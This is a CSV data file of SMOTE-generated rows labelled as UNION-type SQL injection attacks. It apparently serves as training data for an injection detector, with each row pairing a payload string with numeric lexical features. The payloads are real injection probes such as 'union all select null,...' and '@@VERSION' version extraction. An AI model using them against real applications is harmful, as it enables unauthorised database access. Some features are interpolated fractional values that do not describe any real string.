id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000033,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000228,0.039961777519167144,75.9601321295921,21.980066064796052,3.7915566831213234,13.999999999999998,36.07973574081579,13.880396388776306,12.0,0.18430977065891013,0.47501692027679315,0.18269350564237374,0.15797980342192297,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.980066064796051,0.0,0.0,7.019933935203949,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000064,1.1382054040491378,67.92273039719842,14.584546079439683,3.010001456007992,50.0,1.0,6.338184317758738,10.584546079439685,0.7371128527780393,0.014742257055560787,0.09237166133308225,0.15577322883331765,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.5845460794396844,0.0,0.0,8.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.5845460794396844,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000054,0.44777100249943264,73.32392402832534,25.238147285602427,4.168946017848794,25.01918294256631,28.60948217151806,10.542888371361457,9.152370542879515,0.3384776608182685,0.39263360209807185,0.14336530490427718,0.12552343217938242,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.152370542879515,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000036,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000078,0.15121212121483202,56.45642648935909,20.0,3.7763861923722883,13.999999999999998,20.0,14.365141191487275,8.091285297871819,0.24812939963377423,0.35447057090539175,0.25411532080569676,0.14328470865513732,0.0,0.0,3.0,0.0,0.0,0.0,0.0,2.091285297871819,0.0,0.0,3.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,union,"1%""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000057,0.815004013997287,62.167323872865126,17.0,3.2560261013387017,39.665352254269756,1.0,11.501971618595366,10.0,0.6387090514832474,0.016089689338312507,0.1843043657953152,0.16089689338312485,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.583661936432561,1.0,0.0,5.416338063567439,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000291,0.17917383185247168,69.83136320697079,21.16627264139416,3.3737423657157493,13.999999999999998,40.665090565576634,4.0,11.166272641394158,0.20061905897031118,0.5821850216893765,0.057319731134374635,0.15987618820593774,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.166272641394158,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,union,"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",nearest_attack_euclidean,R000256,0.37042746876825516,79.80351040245246,22.0,3.7522245663191134,13.999999999999998,36.0,17.042808321961967,12.760702080490493,0.17556056763574815,0.4514414596347809,0.21312610247478478,0.15987187025468613,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.760702080490492,0.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R000302,0.2886981494162877,72.506554449704,23.0,3.7901899765883527,40.205243559763204,9.0,14.0,9.301310889940801,0.5542655057829375,0.12424777797491918,0.19327432129431873,0.12821239494782447,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.3013108899408,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000041,attack,union,"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",nearest_attack_euclidean,R000247,0.9126490538111055,74.96819811042727,23.39065566053182,3.886237354760513,22.65606603680909,28.874754715745453,15.218688678936363,8.218688678936363,0.30175161247287796,0.3842887856626247,0.2043523822229317,0.10960721964156561,0.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.2186886789363633,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000042,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.39158029011596834,75.41238573809703,16.146903565475743,3.084305559974588,53.41238573809703,1.0,8.0,13.0,0.7081638315493667,0.013265280384119671,0.10612224307295755,0.17244864499355603,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.14690356547574202,0.0,8.853096434524257,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,0.2672919481131926,58.588057855586484,14.0,3.0213279968132047,44.87044628446919,1.0,4.0,8.717611571117297,0.765810944154901,0.017094527922549507,0.0683781116901982,0.14871641623235135,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.717611571117297,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000113,0.21369494859394092,65.12594978049009,21.225189956098017,3.7910548843687004,13.999999999999998,36.90075982439207,4.0,10.225189956098017,0.21518041283359118,0.5663755517806723,0.06148011795245463,0.15696391743328175,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.225189956098018,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000097,0.9736046770089258,69.39877516782441,18.398775167824404,3.6117138194849296,13.999999999999998,40.0,4.0,11.398775167824404,0.20174268067297274,0.5764076590656364,0.05764076590656364,0.16420889435482722,0.3987751678244047,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.3987751678244047,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000046,attack,union,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",nearest_attack_euclidean,R000080,0.21510681892841804,68.11294374814811,21.0,3.713335685930036,13.999999999999998,28.89035499851849,14.0,11.222588749629622,0.20572528762975256,0.42381661690559524,0.20572528762975256,0.16473280783489955,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,5.222588749629622,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000047,attack,union,"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",nearest_attack_euclidean,R000205,1.2823497759919786,79.0,23.654184329084178,3.754074086146465,43.69163134183165,9.0,18.411158210891138,7.8972104472772156,0.5530586245801474,0.11392405063291139,0.23305263558090045,0.09996468920604071,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.5513947763613922,0.0,0.0,4.345815670915823,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000048,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000082,0.6569369228943942,72.90388948993467,22.0,3.6695079949615272,13.999999999999998,34.41037197315913,12.192221020130653,12.301296496644891,0.1921010272483175,0.47122635525732365,0.1679973075167262,0.1686753099776326,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.6987035033551088,1.0,0.0,6.602592993289782,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000078,0.5403050875477844,57.63088482795563,20.0,3.7328567586817805,13.999999999999998,20.0,15.304707862364506,8.326176965591127,0.24331604578706706,0.34759435112438153,0.2647046992684524,0.14438490382009894,0.0,0.0,3.0,0.0,0.0,0.0,0.0,2.3261769655911264,0.0,0.0,3.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,union," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",nearest_attack_euclidean,R000035,1.1227845893639135,72.00987527776692,30.905499898993845,4.320868495515257,40.0,2.273625025251537,17.18900020201231,12.547250050503077,0.5578994545089353,0.031315285541091004,0.2365747979660046,0.17421046198396906,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.5472500505030775,0.0,0.0,1.0,4.273625025251539,1.0,0.0,1.0,0.0,0.0,1.0,0.2736250252515387,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000051,attack,union," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000027,0.2943938291910448,77.43085676673812,27.538570958422643,3.97020672883392,40.43085676673812,2.8922858083154708,23.10771419168453,11.0,0.5220365079957207,0.03742399181338413,0.2984422458112445,0.1420972543796506,0.0,0.0,2.0,0.0,1.1077141916845283,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000052,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000036,1.1616642079534032,73.91980086258161,31.540099568709195,4.391737132967979,44.0,2.0,16.459900431290805,11.459900431290805,0.5953477190952345,0.02706125995887429,0.22262208542153844,0.1549689355243527,0.0,0.0,2.0,0.0,1.459900431290805,1.0,0.0,0.0,0.0,0.0,1.0,6.459900431290805,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000138,0.0046446188036563425,73.97516478089481,22.0,3.736832608557293,13.999999999999998,43.980131824715855,4.0,11.995032956178962,0.18925728418869422,0.5945206628808464,0.05407350976819836,0.16214854316226118,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.995032956178964,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000215,0.055582660724697884,67.29209356489898,16.0,3.156537526029396,42.15578323461279,1.0,14.077891617306395,10.058418712979796,0.6265324985426465,0.014872207214252087,0.20916079877155855,0.14943449547154286,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.019472904326599,0.0,0.0,6.038945808653198,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000221,0.06164220044619136,61.69649984044658,21.0,3.864425794316335,13.999999999999998,23.757199872357262,14.0,9.939299968089315,0.22700877256189808,0.38489824445824344,0.2270087725618981,0.1610842104179603,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.9392999680893155,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-1123'   )    )     )   union all select 6735,6735,6735,6735,6735,6735,6735,6735#",nearest_attack_euclidean,R000256,0.36879841155239845,79.80877229628304,22.0,3.7521620432861646,13.999999999999998,36.0,17.047017837026434,12.761754459256608,0.17554860101560063,0.45141068832583015,0.21316610517642076,0.15987460548214844,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.7617544592566086,0.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",nearest_attack_euclidean,R000135,0.06788910823156696,69.32982430069441,23.0,3.8190270933885535,19.0,32.26385944055553,10.0,8.065964860138882,0.27413500553991504,0.4652667300775774,0.14428158186311318,0.11631668251939435,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,4.065964860138881,4.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000014,0.4089023585101859,73.89877737216227,31.550611313918864,4.359568024583304,43.79755474432454,2.550611313918864,17.0,10.550611313918864,0.5924151318182422,0.03461156051134068,0.23008598806817193,0.14288731960224513,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000059,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000306,1.1352998909843783,61.948760436279045,22.61859505453488,3.888133541482213,13.999999999999998,27.423140654418567,10.288429672790718,10.237190109069761,0.22691426555791996,0.438365400425446,0.16981318360085407,0.16490715041578002,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.3814049454651196,1.0,0.0,4.855785163604641,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000060,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000181,0.3059858316685059,77.44339236910656,21.28867847382131,3.623084810229897,13.999999999999998,33.15471389528525,18.0,12.288678473821312,0.1809279575751313,0.4278053444168728,0.2326216597394545,0.1586450382685414,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.288678473821312,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000108,0.350149775359884,57.380951014344944,20.0,3.739505853965474,13.999999999999998,29.183672298009952,4.0,10.197278716334992,0.2450680320916252,0.5070456684405354,0.07001943774046435,0.17786686172737504,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.901360641832504,0.0,5.295918074502488,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000043,0.04242745199605189,82.0,33.8613347317524,4.204576423327243,40.0,3.0198093240353714,25.01980932403537,13.960381351929257,0.4878048780487805,0.03682694297604114,0.30511962590287034,0.17024855307230802,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000063,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000269,0.011668513788373405,74.0549718776846,20.021988751073835,3.6436609431768554,13.999999999999998,40.04397750214767,8.0,12.010994375536917,0.18905754254403281,0.5407210845110408,0.10803288145373303,0.16218849149119346,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.010994375536917,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000064,attack,union," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000028,0.0022305469140812876,72.0,31.990102252800693,4.355092734020304,42.0,3.0,17.0,10.0,0.5833333333333334,0.04166666666666666,0.2361111111111111,0.1388888888888889,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000065,attack,union,"-4400 union all select 3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",nearest_attack_euclidean,R000196,0.2460797856596342,74.0,18.367768269004518,3.498598157494573,13.999999999999998,44.0,4.0,12.0,0.1891891891891892,0.5945945945945946,0.05405405405405406,0.16216216216216217,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
